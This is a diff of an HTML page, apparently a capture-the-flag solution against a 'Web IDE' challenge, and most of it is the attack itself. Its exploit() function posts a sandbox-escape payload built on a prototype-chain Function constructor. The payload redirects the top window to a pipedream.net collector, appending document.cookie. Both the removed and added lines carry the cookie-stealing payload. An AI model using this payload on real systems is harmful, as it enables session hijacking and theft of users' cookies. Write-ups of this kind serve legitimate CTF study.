@@ -5,14 +5,12 @@
     <title>Web IDE</title>
     <script>
       function exploit(){
-    document.querySelector('iframe')
-      .contentWindow
-      .postMessage(`[].__proto__.__proto__.constructor.constructor('return top.window.location="https://encnu1395lyv7.x.pipedream.net/?q="+document.cookie')()`, '*');}</script>
+       h = window.open("https://web-ide.dicec.tf/sandbox.html");
+      h.postMessage(`[].__proto__.__proto__.constructor.constructor('return top.window.location="https://encnu1395lyv7.x.pipedream.net/?q="+document.cookie')()`, '*');}</script>
   </head>
   <body>
     <div id="editor">
       <iframe src="https://web-ide.dicec.tf/sandbox.html" frameborder="0" sandbox="allow-scripts allow-same-origin" onload="exploit();"></iframe>
-      <iframe src="https://web-ide.dicec.tf/ide/">
       <br />
       <button id="run">Run Code</button>
       <button id="save">Save Code (Admin Only)</button>
